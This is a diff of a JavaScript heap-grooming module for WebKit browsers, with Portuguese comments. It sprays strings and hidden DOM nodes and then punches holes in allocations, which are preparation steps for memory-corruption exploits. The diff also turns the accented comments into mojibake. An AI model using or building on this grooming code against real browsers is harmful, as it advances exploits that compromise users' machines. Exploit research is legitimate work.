@@ -1,6 +1,6 @@
 /**
- * MOD_GROOMER.JS — Manipulação Avançada de Heaps Específicos
- * Foco: JSString Heap, DOM bmalloc e criação de "Buracos" (Hole Punching)
+ * MOD_GROOMER.JS â€” ManipulaÃ§Ã£o AvanÃ§ada de Heaps EspecÃ­ficos
+ * Foco: JSString Heap, DOM bmalloc e criaÃ§Ã£o de "Buracos" (Hole Punching)
  */
 
 export const Groomer = {
@@ -11,24 +11,32 @@ export const Groomer = {
         let strings = [];
         let base = "A".repeat(size);
         for (let i = 0; i < count; i++) {
-            // O slice força o motor a alocar uma NOVA string na memória
+            // O slice forÃ§a o motor a alocar uma NOVA string na memÃ³ria
             strings.push((base + i.toString()).slice(0, size));
         }
         return strings;
     },
 
     // 2. DOM Node Grooming (bmalloc)
-    sprayDOM: function(tagName, count) {
-        let nodes = [];
-        for (let i = 0; i < count; i++) {
-            let el = document.createElement(tagName);
-            el.id = `groom_${i}`;
-            nodes.push(el);
+    sprayDOM: function(tag, count) {
+        let trash = [];
+        let sandbox = document.getElementById('groomer-sandbox');
+        if (!sandbox) {
+            sandbox = document.createElement('div');
+            sandbox.id = 'groomer-sandbox';
+            sandbox.style.display = 'none';
+            document.body.appendChild(sandbox);
         }
-        return nodes;
+        
+        for (let i = 0; i < count; i++) {
+            let el = document.createElement(tag);
+            sandbox.appendChild(el); // FIX: ForÃ§a a alocaÃ§Ã£o completa no WebCore
+            trash.push(el);
+        }
+        return trash;
     },
 
-    // 3. O Clássico "Hole Punching" (Queijo Suíço)
+    // 3. O ClÃ¡ssico "Hole Punching" (Queijo SuÃ­Ã§o)
     punchHoles: function(array, step = 2) {
         for (let i = 0; i < array.length; i += step) {
             array[i] = null; // Cria o buraco
